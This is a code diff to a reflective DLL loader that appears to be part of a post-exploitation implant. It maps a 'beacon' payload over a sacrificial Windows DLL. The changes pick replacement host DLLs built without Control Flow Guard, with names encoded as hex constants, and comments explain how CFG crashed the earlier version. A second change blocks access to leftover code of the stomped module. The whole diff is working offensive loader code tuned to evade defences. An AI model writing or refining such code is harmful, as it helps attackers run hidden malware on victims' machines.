@@ -391,18 +391,24 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         DWORD cand_soi;
 
         wq[0] = 0; wq[1] = 0; wq[2] = 0; wq[3] = 0;
-        if (k == 0) {        /* xpsservices.dll  SizeOfImage 0x2bc000 */
-            wq[0] = 0x0073007300700078ULL; wq[1] = 0x0069007600720065ULL;
-            wq[2] = 0x002E007300650063ULL; wq[3] = 0x0000006C006C0064ULL;
-        } else if (k == 1) { /* msxml6.dll       SizeOfImage 0x261000 */
-            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0036006CULL;
-            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
-        } else if (k == 2) { /* msxml3.dll       SizeOfImage 0x20c000 */
-            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0033006CULL;
-            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
-        } else {             /* winhttp.dll      SizeOfImage 0x10d000 */
-            wq[0] = 0x0068006E00690077ULL; wq[1] = 0x002E007000740074ULL;
-            wq[2] = 0x0000006C006C0064ULL; wq[3] = 0x0000000000000000ULL;
+        /* Guard CF (IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000) is fatal
+         * here: ntdll still holds the sacrificial module's original CFG
+         * bitmap, so the indirect call to our DllMain is rejected and the
+         * dispatch lands in leftover original code (BEX64 at
+         * xpsservices+0x1cfa89 on the previous dump). Candidates below
+         * have SizeOfImage > beacon and dllchar without 0x4000. */
+        if (k == 0) {        /* spwizimg.dll     SizeOfImage 0x598000, nocfg */
+            wq[0] = 0x0069007700700073ULL; wq[1] = 0x0067006D0069007AULL;
+            wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
+        } else if (k == 1) { /* shellstyle.dll   SizeOfImage 0x11c000, nocfg */
+            wq[0] = 0x006C006500680073ULL; wq[1] = 0x007900740073006CULL;
+            wq[2] = 0x0064002E0065006CULL; wq[3] = 0x00000000006C006CULL;
+        } else if (k == 2) { /* msvcr100.dll     SizeOfImage 0x0d2000, nocfg */
+            wq[0] = 0x006300760073006DULL; wq[1] = 0x0030003000310072ULL;
+            wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
+        } else {             /* UIRibbonRes.dll  SizeOfImage 0x0ce000, nocfg */
+            wq[0] = 0x0069005200490055ULL; wq[1] = 0x006E006F00620062ULL;
+            wq[2] = 0x002E007300650052ULL; wq[3] = 0x0000006C006C0064ULL;
         }
         wname[27] = 0;
 
@@ -488,6 +494,25 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     {
         DWORD oldp = 0;
         pVP(sc_base, opt->SizeOfHeaders, PAGE_READONLY, &oldp);
+    }
+    /* Anything past the overlay is leftover original code of the
+     * sacrificial DLL. Make it NOACCESS so a stray jump cannot execute
+     * it (the previous dump's RIP was leftover xpsservices at +0x1cfa89). */
+    if (sc_span > size_of_image) {
+        unsigned char * p = sc_base + size_of_image;
+        unsigned char * end = sc_base + sc_span;
+        while (p < end) {
+            MEMORY_BASIC_INFORMATION mbi;
+            DWORD oldp = 0;
+            SIZE_T chunk;
+            if (!pVQ(p, &mbi, sizeof(mbi)))
+                break;
+            chunk = (SIZE_T)((unsigned char *)mbi.BaseAddress + mbi.RegionSize - p);
+            if (p + chunk > end)
+                chunk = (SIZE_T)(end - p);
+            pVP(p, chunk, PAGE_NOACCESS, &oldp);
+            p += chunk;
+        }
     }
 
     if (pFlush && pGetCur)
